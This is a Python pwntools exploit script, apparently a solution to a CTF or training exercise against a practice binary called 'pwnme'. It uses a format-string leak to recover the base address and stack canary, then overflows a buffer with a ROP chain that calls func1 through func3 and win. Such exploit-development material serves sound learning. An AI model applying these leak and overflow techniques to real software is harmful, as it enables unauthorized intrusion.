#!/usr/bin/python3

from pwn import *

'''
1. We need to determine the base address with gdb
2. We need to leak addresses with a format string vulnerability in printf (see leak_address.py)
3. Examine the addresses and determine what addresses we leaked using the same technique we used in previous example
4. Get the address of the canary. Run leak_address.py multiple times and look for random address that ends with
5. Get the address of base. In the example below, we were able to leak the address of vuln + 16
To get the address of base we need to take vuln function's offset and 16 from the leaked address.
6. To pass win funciton's check, we need to call func1, func2, and func3 with the appropriate values.
'''

e = ELF('./pwnme')
vuln_offset = e.symbols['vuln']
win_offset = e.symbols['win']
func1_offset = e.symbols['func1']
func2_offset = e.symbols['func2']
func3_offset = e.symbols['func3']

rop = ROP(e)
print('ROP gadgets:')
for gadget in rop.gadgets:
    # print(hex(gadget))
    print(rop.gadgets[gadget])

ret_offset = 0x100e
pop_ebx_offset = 0x1022

# Leak address first
p = process('./pwnme')
get_leak_payload = b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
p.sendlineafter(b'How about creating a leak AND smashing a canary AND chaining several functions?', get_leak_payload)
# Call recvall() first to see how many bytes we need to recv
# p.recvall()
leak = p.recv(161).decode().replace('(nil)', '0x1')
leaked = leak.split('0x')
vuln_16 = int(leaked[3],16)
base_address = vuln_16 - 16 - vuln_offset
canary = int(leaked[19],16)
print(f'Leak: {leak}')
print(f'Leaked vuln+16 (3rd address): {hex(vuln_16)}')
print(f'Base address {hex(base_address)}')
print(f'Canary: {hex(canary)}')

canary_offset = 24
buffer_overflow_offset = 40

payload = canary_offset * b'A'
payload += p32(canary)
payload += (buffer_overflow_offset - canary_offset - 4) * b'A'

payload += p32(base_address + func1_offset)
payload += p32(base_address + pop_ebx_offset)
payload += p32(0x1337)

payload += p32(base_address + func2_offset)
payload += p32(base_address + pop_ebx_offset)
payload += p32(0xCAFEF00D)

payload += p32(base_address + func3_offset)
payload += p32(base_address + pop_ebx_offset)
payload += p32(0xD00DF00D)

payload += p32(base_address + win_offset)

p.sendline(payload)
p.interactive()
